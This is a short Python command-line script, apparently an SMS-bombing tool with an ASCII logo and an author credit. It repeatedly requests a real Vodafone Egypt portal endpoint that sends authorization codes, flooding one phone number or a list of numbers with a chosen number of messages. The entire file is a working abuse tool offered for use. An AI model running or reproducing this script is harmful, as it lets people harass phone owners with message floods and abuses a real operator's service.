#!/usr/bin/env python3
import requests,time
from optparse import OptionParser
l1st = None
num = None
def getargs():
	global num,l1st,thr,kam
	optp = OptionParser(add_help_option=False)
	optp.add_option("-n","--number",dest='num')
	optp.add_option("-l","--list",dest="l1st",type='str')
	optp.add_option("-h","--help",dest="helper",action='store_true')
	optp.add_option("-m","--many",dest='kam',type='int')
	opts, args = optp.parse_args()
	if opts.num:
		num = opts.num
	if opts.helper:
		print("""Options:
-h, --help         | show this help menu
-n, --number=NUM   | Add The number of target
-l, --list=LIST    | Get All Numbers of targets from wordlist
-m, --many=10      | How many messages you want send it
""")
		exit()
	if opts.l1st:
		l1st = opts.l1st
	if opts.num !=None and opts.l1st != None:
		print("[-] Sorry you can't user --number and --list in one one process ..!!")
		exit()
	if opts.kam:
		kam = opts.kam
	else:
		kam = 5
	if opts.num ==None and opts.l1st == None:
		print('[-] Add number or list for start ..!')
		exit()
def logo():
	print("""\033[91m
\t _    __          __      _____
\t| |  / /___  ____/ /___ _/ ___/
\t| | / / __ \/ __  / __ `/\__ \ 
\t| |/ / /_/ / /_/ / /_/ /___/ / 
\t|___/\____/\__,_/\__,_//____/  
\t                               
\t\033[93m# Coded By : Khaled Nassar @Knassar702\033[0m\n
""")
	time.sleep(1)
def exploit(number=None,word_list=None):
	if number:
		print(f"[!] Starting\n[!] How many messages [{kam}]\n<------------------->")
		time.sleep(0.8)
		try:
			for i in range(kam):
				r = requests.get('https://cloudportal.vodafone.com.eg/portal/login/sendauthorizationcode',params={'mobileNumber':str(number)})
				print(f"[+] Success | {number} | {i}")
		except:
			print("[-] Connection Error ..!")
			exit()
	elif word_list:
		try:
			f = open(word_list,'r')
		except:
			print('[-] Error .. i cant find your word list ..!')
			exit()
		print(f"[!] Starting\n[!] How many messages {kam}\n[!] List : [{l1st}]\n<------------------->")
		for number in f:
			for i in range(kam):
				try:
					r = requests.get('https://cloudportal.vodafone.com.eg/portal/login/sendauthorizationcode',params={'mobileNumber':str(number.strip())})
					print(f'[+] Success | {number.strip()}')
				except:
					print('[-] Connection Error ..!')
					exit()
if __name__ == '__main__':
	logo()
	getargs()
	if l1st:
		exploit(word_list=l1st)
	elif num:
		exploit(number=num)
	else:
		exit()
